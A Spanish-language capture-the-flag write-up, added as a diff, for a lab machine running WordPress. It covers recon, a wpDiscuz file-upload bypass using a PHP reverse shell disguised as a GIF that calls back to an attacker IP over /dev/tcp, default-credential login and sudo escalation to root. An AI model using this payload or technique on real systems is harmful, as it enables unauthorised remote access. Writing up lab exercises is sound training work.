@@ -1,0 +1,209 @@
+<p>Esta máquina es de la plataforma Hack Journey <a href="https://www.aprendehacking.com/products/hack-journey">visitar</a></p>
+
+<p>Dificultad: Fácil</p>
+
+<p>Habilidades:</p>
+
+<ul>
+  <li>Fuzzing</li>
+  <li>Information Leakage</li>
+  <li>CMS Exploitation (Wordpress)</li>
+  <li>PHP Reverse Shell (Bypass upload file with GIF)</li>
+  <li>Lateral Movement</li>
+</ul>
+
+<p><img src="/assets/images/hj-writeup-blogger/blogger.png" alt="Captura de pantalla (62).png" /></p>
+
+<h1 id="ip-de-la-maquina">IP de la Maquina</h1>
+
+<p>10.10.0.5</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+
+<p>Comprobando conectividad con la maquina</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.10.0.5
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/ping.png" alt="ping.png" /></p>
+
+<p>Identificando el sistema operativo lo realizamos con un script en python que en base al TTL nos dice ante que SO nos encontramos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wichSystem.py
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/SO.png" alt="SO.png" /></p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Escaneo de los puertos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> scanP 10.10.0.5
+
+<span class="c"># sudo Privilegios de administrador</span>
+<span class="c"># -p- Para que escanee todo el rango de puertos disponible (65,535)</span>
+<span class="c"># --open Solo muestre los puertos abiertos (no filtrados ni cerrados)</span>
+<span class="c"># -sS Aplicamos un tcp Syn port Scan (agilizar el escaneo)</span>
+<span class="c"># --min-rate 5000 Agilizar escaneo</span>
+<span class="c"># -vvv Nos reporte por consola a medida nos vaya descubriendo cosas</span>
+<span class="c"># -n Para que no aplique resolucion DNS (ralentiza el escaneo)</span>
+<span class="c"># -Pn (el favorito de todos XD) Para que no aplique descubrimiento de hosts (host discovery)</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/scanP.png" alt="scanP.png" /></p>
+
+<p>Vamos a utilizar una serie de scripts básicos de reconocimiento de nmap, detectar las versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito scanS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-oN</span> scanS 10.10.0.5
+
+<span class="c"># -sCV Lanzamos scripts básicos de reconocimiento y detectamos versiones para esos servicios</span>
+<span class="c"># -p Indicamos los puertos</span>
+<span class="c"># -oN Guardamos en formato nmap o formato normal (tal como se muestra por consola) </span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/scanS.png" alt="scanS.png" /></p>
+
+<p>Como únicamente tenemos 2 puertos abiertos, uno es el 22 donde corre el servicio SSH para el cual no tenemos credenciales, Inspeccionando la web un poco, viendo el Código fuente, no logramos encontrar nada relevante.</p>
+
+<p>Usando Wappalyzer  el cual es un Pluggin del navegador, podemos ver las tecnologías con las que esta hecha una web de igual manera con whatweb es lo mismo pero a nivel de consola. No encontramos nada relevante.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/wappalyzer.png" alt="wappalyzer.png" /></p>
+
+<p>Whatweb</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.0.5
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/whatweb.png" alt="whatweb.png" /></p>
+
+<p>Pasamos a lo siguiente, realizar fuzzing sobre la pagina para lograr encontrar directorios ocultos.</p>
+
+<p>Usaremos ffuf para realizar el fuzzing</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-ic</span> <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-fc</span><span class="o">=</span>404 <span class="nt">-r</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.0.5/FUZZ
+
+<span class="c"># -ic Para ocultar comentarios de los diccionarios</span>
+<span class="c"># -c Formato colorizado</span>
+<span class="c"># -t Cantidad de hilos </span>
+<span class="c"># -fc Para filtrar (que no nos muestre ese resultado)</span>
+<span class="c"># -r Para que siga las redirecciones</span>
+<span class="c"># -w Indicar el diccionario  </span>
+<span class="c"># -u Indicamos la url</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/fuzzing.png" alt="fuzzing.png" /></p>
+
+<p>Gracias al fuzzing encontramos algunos directorios, inspeccionando los directorios, nos encontramos con algo interesante en assets/fonts.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/fuzzing_2.png" alt="fuzzing 2.png" /></p>
+
+<p>Revisando el directorio encontramos un tipo de blog que al parecer esta hecho en wordpress, pero no tenemos acceso, revisando un poco mas nos encontramos con un subdominio. Tenemos que agregarlo al /etc/hosts para que podamos acceder.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/VirtualHosting.png" alt="VirtualHosting.png" /></p>
+
+<p>Una vez agregado el subdominio visitamos la web, vemos que esta hecho en wodrpess y analizamos nuevamente con wappalyzer para comprobarlo.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/wordpress.png" alt="wordpress.png" /></p>
+
+<p>En efecto esta construida con wordpress, ahora que estamos ante un CMS podemos utilizar distintas herramientas para comprobar la seguridad de esta, en este caso usaremos wpscan. Realizando varias pruebas no logramos mediante escaneo pasivo encontrar información sobre pluggins vulnerables pero al cambiar a modo agresivo si logramos identificar varias vulnerabilidades para un plugin en concreto (wpDiscuz), y también identificamos un nombre de usuario j@m3s.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://10.10.0.5/assets/fonts/blog/ <span class="nt">-e</span> vp,u <span class="nt">--plugins-detection</span> aggressive <span class="nt">--api-token</span>
+
+<span class="c"># --url Indicamos la url</span>
+<span class="c"># -e vp Para que nos detecte pluggins vulnerables y u para que nos identifique posibles usuarios </span>
+<span class="c"># --plugins-detection Cambiar el modo de deteccion de los pluggins, en este caso usamos el agresivo</span>
+<span class="c"># --api-token le pasamos la API de wpscan ya que sin esta limita la busqueda de info </span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/wpdiscuz.png" alt="wpdiscuz.png" /></p>
+
+<h1 id="explotación">Explotación</h1>
+
+<p>Nos encontramos varias vulnerabilidades, realizando varias pruebas la que me funciono fue Unauthenticated Arbitrary File Upload, mediante el sistema de comentarios de un post subir una reverse shell haciendo bypassing de el campo de imágenes, subiendo la revshell como GIF.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/uploadfile.png" alt="uploadfile.png" /></p>
+
+<p>Contenido de la revshell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF89a<span class="p">;</span>
+&lt;?php
+<span class="nb">exec</span><span class="o">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.8.0.12/1234 0&gt;&amp;1'"</span><span class="o">)</span><span class="p">;</span> ?&gt;
+
+<span class="c">#Agregamos la primer linea para que la interprete como GIF</span>
+</code></pre></div></div>
+
+<p>Ahora solo necesitamos ingresar a la ruta donde se almacena la revshell, para hacerlo simplemente hacemos clic sobre el archivo, y nos ponemos en escucha con netcat.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/revshell_upload.png" alt="revshell upload.png" /></p>
+
+<p>Nos ponemos en escucha</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 1234
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/nc.png" alt="nc.png" /></p>
+
+<p>Una vez hecho sucede la magia y conseguimos acceso a la maquina como el usuario www-data</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/access.png" alt="access.png" /></p>
+
+<p>Realizamos un tratamiento de la TTY para poder tener una shell estable y full interactiva.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script <span class="nt">-c</span> bash /dev/null
+ctrl + z
+<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span> <span class="o">(</span>para traer el proceso de nuevo<span class="o">)</span>
+reset xterm
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+
+<span class="c">#Le damos las proporciones adecuadas en mi caso 37 filas y 184 columnas</span>
+<span class="nb">stty </span>rows 37 columns 184
+
+<span class="c">#Listo con esto ya tenemos una shell totalmente interactiva</span>
+
+</code></pre></div></div>
+
+<p>Realizamos un cat al /etc/passwd para ver que usuarios tenemos disponibles</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/passwd
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/passwd.png" alt="passwd.png" /></p>
+
+<p>Visualizamos los home de cada usuario ya que podemos entrar y dentro de James encontramos el user.txt pero no tenemos permisos para visualizar el archivo.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/user_denied.png" alt="user denied.png" /></p>
+
+<p>Ahora nos queda realizar escalada de privilegios mediante movimiento lateral intentando cambiar de usuario.</p>
+
+<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
+
+<p>Como observamos tenemos usuarios con nombres por defecto así que probamos credenciales por defecto. y logramos acceder como el usuario vagrant.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/vagrant_user.png" alt="vagrant user.png" /></p>
+
+<p>Ahora comprobamos una serie de comandos para ver de que forma podemos elevar nuestros privilegios. vemos que con el comando sudo -l podemos ejecutar cualquier comando sin proporcionar contraseña.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/sudo_-l.png" alt="sudo -l.png" /></p>
+
+<p>Cambiamos al usuario James para ver el user.txt</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/usertxt.png" alt="usertxt.png" /></p>
+
+<p>Nos encontramos con un archivo que si observamos bien esta codificado en base64. Lo copiamos en nuestra maquina y vemos que contiene el archivo.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/base64_decode.png" alt="base64 decode.png" /></p>
+
+<p>Nos encontramos con la flag de la maquina, para ganar privilegios máximos, recordemos que con el usuario vagrant podemos ejecutar cualquier comando sin proporcionar la contraseña. Solo ejecutamos sudo root y ganamos privilegios totales sobre la maquina.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/root.png" alt="root.png" /></p>
+
+<p>Ya con esto hemos completado la maquina. ¡Gracias por leer hasta aquí! Espero que este writeup te haya sido útil para comprender mejor los pasos para resolver esta máquina.  ¡Nos vemos en el próximo reto, y sigue hackeando con ética!</p>
+
+<p>Para agregar como extra si con el usuario vagrant visualizábamos las tareas cron nos encontramos una tarea aparte de las que son por defecto. Al visualizarla vemos que ejecuta un script el usuario root. Intentamos ver el script y logramos hacerlo, el script hace un comprimido del home del usuario james y lo almacena en el directorio /tmp, probamos descomprimir y lo hacemos sin problema, de esta manera también podemos obtener la flag ya que nos muestra el base64.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/cat_crontab.png" alt="cat crontab.png" /></p>
+
+<p><img src="/assets/images/hj-writeup-blogger/vagrant_base64.png" alt="vagratnt base64.png" /></p>
+
+<p>Y esta seria otra forma de obtener la flag, solo como dato curioso. Nos vemos</p>
